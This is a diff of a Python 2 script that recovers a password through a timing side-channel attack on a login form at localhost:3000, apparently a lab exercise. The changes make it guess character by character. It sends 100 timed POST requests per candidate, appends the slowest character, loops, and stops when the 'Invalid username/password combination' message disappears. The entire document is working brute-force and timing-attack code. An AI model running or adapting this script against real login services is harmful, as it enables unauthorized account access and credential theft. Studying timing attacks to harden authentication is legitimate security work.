@@ -10,17 +10,19 @@
 import time
 import requests
 import string
+import re
+import sys
 
 USERNAME = 'test'
 URL = 'http://localhost:3000/login'
 #CHARSET = string.ascii_lowercase
 CHARSET = 'abcde'
-PASSWORD = ''
+#SUCCESSFULLOGINREGEX = re.compile()
 
 # set to be the number of requests to set to the server for every character
-NUMREQUESTS = 1000
+NUMREQUESTS = 100
 
-def makerequest():
+def makerequest(guess):
     '''
         Makes the request to the server with the username/password combo.
         Passes a dict containing the character and a value containing the 
@@ -35,18 +37,27 @@ def makerequest():
 
     # for every character in the characterset, make a request
     for c in CHARSET:
+        newguess = guess + c
+
         # initialize the time for the character to be 0
         chartimes[c] = 0.0
 
-        print "Sending " + str(NUMREQUESTS) + " requests to the server for the character " + c
-        parameters = {'username': USERNAME, 'password': c}
+        print "Sending " + str(NUMREQUESTS) + " requests to the server for the password '" + newguess + "'"
+        parameters = {'username': USERNAME, 'password': newguess}
         for i in range(0,NUMREQUESTS):
             start = time.time()
             # make request
             r = requests.post(URL, data=parameters)
-            #print "response is: " + r.text
             end = time.time()
+
+            # if the response doesn't contain the following string, you successfully logged in and now have the password
+            if "Invalid username/password combination" not in r.text:
+                print "Successfully logged in! Username: " + USERNAME + " Password: " + newguess
+                sys.exit()
+            #print "response is: " + r.text
             chartimes[c] += end - start
+            if i == NUMREQUESTS-1:
+                print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(chartimes[c]) + " seconds."
 
     # get avg of chartimes
     chartimeavg = getaverage(chartimes)
@@ -57,9 +68,11 @@ def makerequest():
     # sort the characters based on the average time
     for key, value in sorted(chartimeavg.iteritems(), key=lambda (k,v): (v,k)):
         print "%s: %s" % (key, value)
-        #if n < 1:
-        #    print "%s: %s" % (key, value)
-        #n += 1
+        if n == len(chartimeavg.keys())-1:
+            newguess = guess + key
+            print "Guessing password is: " + newguess
+            return newguess
+        n += 1
 
 
 
@@ -77,11 +90,13 @@ def getaverage(chartimes):
 
     # get average time for each request for every character
     for char in chartimes:
-        print "Total time to make " + str(NUMREQUESTS) + " requests for " + char + " was " + str(chartimes[char]) + " seconds."
         chartimeavg[char] = chartimes[char]/NUMREQUESTS
 
     return chartimeavg
 
 
 if __name__ == '__main__':
-    makerequest()
+    temppass = ''
+
+    while True:
+        temppass = makerequest(temppass)
